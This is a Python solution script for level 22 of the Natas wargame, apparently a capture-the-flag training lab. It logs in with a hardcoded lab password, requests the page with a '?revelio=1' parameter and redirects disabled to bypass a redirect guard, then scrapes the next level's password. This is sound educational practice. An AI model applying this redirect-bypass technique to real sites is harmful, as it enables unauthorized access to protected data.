import requests
import re

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

payload ="?revelio=1"
response = session.get(url+payload,auth=(username,password), allow_redirects = False)
print(response.text)
print("="*50)

print("\nThe password for the next level is: " + re.findall("Password: (.*)</pre>", response.text)[0])